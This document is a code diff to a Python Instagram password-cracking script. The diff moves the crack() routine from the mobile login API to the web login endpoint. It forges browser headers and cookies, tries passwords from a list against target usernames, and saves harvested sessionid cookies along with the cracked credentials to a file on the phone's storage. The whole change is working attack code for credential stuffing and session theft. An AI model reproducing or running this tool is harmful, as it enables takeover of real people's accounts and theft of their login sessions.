@@ -18,6 +18,7 @@ import string
 import os
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime 
 # Global variables with proper initialization
 loop = 0
 oks = []
@@ -97,63 +98,69 @@ def crack(uid, password_list, total_count):
             sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
             sys.stdout.flush()
             
-            # Create session and generate device hash
+            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)
             session = requests.Session()
-            device_hash = generate_device_hash(uid, pw)
+            response = session.get('https://www.instagram.com/accounts/login/')
+            csrftoken = response.cookies.get('csrftoken')
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            cookies = {
+            'datr': 'wDF1aOt9UdNuCskTeplHs7Yx',
+            'ig_did': '534026BE-B655-4318-AB86-5CFD617D4D50',
+            'mid': 'aHUxwQALAAEhOjO5lKEpzt85Xu9g',
+            'ig_nrcb': '1',
+            'ps_l': '1',
+            'ps_n': '1',
+            'wd': '1155x773',
+            'rur': '"CCO\\05479957305321\\0541797856743:01fe07c54e37147ebbc67f3a7ff89858d9e72fa0e96320c926f32037994497420ca612e6"',
+            'csrftoken': csrftoken,}
             headers = {
-            'host': 'i.instagram.com',
-            'x-ig-app-locale': 'in_ID',
-            'x-ig-device-locale': 'in_ID',
-            'x-ig-mapped-locale': 'id_ID',
-            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
-            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
-            'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
-            'x-ig-www-claim': '0',
-            'x-bloks-is-prism-enabled': 'false',
-            'x-bloks-is-layout-rtl': 'false',
-            'x-ig-device-id': str(uuid.uuid4()),
-            'x-ig-family-device-id': str(uuid.uuid4()),
-            'x-ig-android-id': f'android-{device_hash[:16]}',
-            'x-fb-connection-type': 'MOBILE.LTE',
-            'x-ig-connection-type': 'MOBILE(LTE)',
-            'x-ig-capabilities': '3brTv10=',
-            'priority': 'u=3',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-S906U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.124 Mobile Safari/537.36 Instagram 408.0.0.0.45 Android (35/15; 450dpi; 1080x2340; samsung; SM-S906U1; g0q; qcom; es_LA; 827194262; IABMV/1)',
-            'accept-language': 'id-ID, en-US',
-            'x-mid': '',
-            'ig-intended-user-id': '0',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'x-fb-http-engine': 'Liger',
-            'x-fb-client-ip': 'True',
-            'x-fb-server-cluster': 'True',
-            'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
-            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
-            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
-            'x-ig-app-id': '3419628305025917',
-            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
-            'connection': 'keep-alive'
-            }
-            payload = {'params': '{"client_input_params":{"device_id":"'+ str(headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(uid)+'","machine_id":"'+str(headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(uid)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(headers['x-ig-family-device-id'])+'","device_id":"'+str(headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}','bk_client_context': '{"bloks_version":"'+ str(headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(headers['x-bloks-version-id'])}
-            encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id']))
-            # Update headers with content length and cookies
-            headers.update({
-                'content-length': str(len(payload)),
-                'cookie': ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
-            })
-            
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/?flo=true',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="143.0.7499.147", "Chromium";v="143.0.7499.147", "Not A(Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-csrftoken': csrftoken,
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': 'hmac.AR0ZBluzE5eab1oDGWSBU1s4d6pzUESqf9_kO8JTPMBUVa5I',
+            'x-instagram-ajax': '1031378256',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-web-session-id': 'xwu66r:r3cl82:m1ree6',}
+            data = {
+            'enc_password': enc_password,
+            'caaF2DebugGroup': '0',
+            'isPrivacyPortalReq': 'false',
+            'loginAttemptSubmissionCount': '0',
+            'optIntoOneTap': 'false',
+            'queryParams': '{"flo":"true"}',
+            'trustedDeviceRecords': '{}',
+            'username': uid,
+            'jazoest': '22898',}
             # Make API request
-            response = session.post(
-                'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',
-                data=encode,
-                headers=headers,
-                timeout=30,
-                allow_redirects=True
-            )
-            
+            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            wanted = ["ds_user_id", "sessionid"]
+            all_cookies = session.cookies.get_dict()
+            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
             # Check response
-            if 'logged_in_user' in response.text:
+            if 'sessionid' in extracted:
+                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                save_success(uid, pw)
+                print("Cookies:", cookie_str)
+                open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
+                oks.append(uid)
                 return True
             elif 'challenge_required' in response.text:
                 print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
